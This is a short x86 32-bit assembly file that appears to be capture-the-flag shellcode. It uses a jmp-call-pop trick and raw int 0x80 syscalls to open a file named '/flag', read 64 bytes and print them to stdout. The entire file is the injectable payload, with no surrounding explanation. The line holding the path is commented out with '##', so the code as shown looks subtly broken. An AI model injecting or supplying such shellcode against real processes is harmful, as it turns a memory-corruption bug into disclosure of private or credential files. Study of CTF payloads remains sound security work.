.intel_syntax noprefix
.globl _start
_start:
    jmp loadstring
file_read:
    pop ebx
    xor eax,eax
    xor ecx,ecx
    xor edx,edx
    mov al,0x5
    int 0x80

    mov ebx,eax
    mov ecx,esp
    mov dl,0x40
    mov al,0x3
    int 0x80

    xchg eax,edx
    mov bl,0x1
    mov al,0x4
    int 0x80

    ret
loadstring:
    call file_read
    ## .asciz "/flag"
